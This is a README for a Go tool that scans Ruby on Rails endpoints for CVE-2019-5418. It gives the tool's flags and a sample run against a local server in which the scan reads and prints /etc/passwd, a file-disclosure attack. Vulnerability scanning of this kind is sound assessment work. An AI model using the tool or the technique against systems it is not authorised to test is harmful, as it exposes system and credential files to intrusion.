# CVE-2019-5418-Scanner
A multi-threaded Golang scanner to identify Ruby endpoints vulnerable to CVE-2019-5418

## Usage
```
Usage of ./CVE-2019-5418-Scanner:
  -auth string
        Perform a scan using a auth token i.e Basic YmFzZTY0VG9rZW5WYWx1ZQ== (default "nope")
  -http
        Use HTTP over HTTPS
  -insecure
        Ignore SSL/TLS Errors
  -log
        Log results to file
  -path string
        Path to use in the request i.e /index (default "/")
  -single string
        Scan a single URL i.e https://target.com (default "targets.txt")
  -targets string
        File containing a list of host names, one host per line i.e https://target.com (default "targets.txt")
  -timeout int
        Request timeout in Seconds (default 2)
  -verb string
        HTTP verb to use i.e GET (default "GET")
  -verbose
        Verbose output
```

### Scanning a single host
```
./CVE20195418Scanner --single=http://localhost:3000/robots
2019/03/19 15:45:01.639633 [!] URL [GET]: http://localhost:3000/robots/ 
-----POTENTIAL: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
```
For more info on the vuln,https://github.com/mpgn/CVE-2019-5418
